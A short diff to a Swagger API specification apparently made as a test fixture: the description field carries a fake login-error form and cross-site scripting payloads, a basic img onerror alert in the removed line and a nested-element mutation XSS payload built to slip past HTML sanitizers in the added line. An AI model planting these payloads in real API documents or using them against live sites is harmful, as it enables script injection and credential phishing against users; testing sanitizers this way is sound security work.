@@ -1,7 +1,7 @@
 swagger: '2.0'
 info:
   title: Classic API Resource Documentation
-  description: <h1>ERROR! Repeat the login</h1><p>Membership No.<br/><input><br/><a href=http://localhost><br><input type=button value="Login"></a><br/><img src=https://localhost><img src=x onerror=alert(document.domain)>
+  description: <h1>ERROR! Repeat the login</h1><p>Membership No.<br/><input><br/><a href=http://localhost><br><input type=button value="Login"></a><br/><img src=https://localhost><!--XSS--><form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>
   version: production
 basePath: /JSSResource/
 produces:
